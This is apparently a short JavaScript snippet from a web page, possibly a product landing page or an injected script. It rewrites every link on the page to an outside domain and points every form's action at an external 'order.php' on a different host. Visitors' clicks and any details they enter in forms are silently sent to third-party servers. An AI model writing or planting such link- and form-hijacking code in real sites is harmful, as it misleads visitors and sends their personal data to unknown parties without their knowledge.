var anchors = document.getElementsByTagName("a");
var anchor = document.getElementsByTagName("form");
for (var i = 0; i < anchors.length; i++) {
  if (anchor.length < 1) {
    anchors[i].href = "https://lfbgfdde.profy-goods.com";
  } else {
    anchors[i].href = "#target";
  }
}
for (var i = 0; i < anchor.length; i++) {
  anchor[i].action = "https://keitar.pro/lander/pl-urotrin-ever/order.php";
}